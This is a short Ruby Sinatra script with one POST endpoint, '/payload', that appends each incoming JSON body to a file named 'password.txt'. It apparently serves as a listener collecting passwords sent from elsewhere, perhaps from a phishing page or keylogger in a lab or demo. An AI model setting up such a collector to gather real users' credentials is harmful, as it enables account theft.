require 'sinatra'
require 'json'

post '/payload' do
  status 204 #successful request with no body content
  
  request.body.rewind
  request_payload = JSON.parse(request.body.read)
  
  #append the payload to a file
  File.open("password.txt", "a") do |f|
    f.puts(request_payload)
  end
end
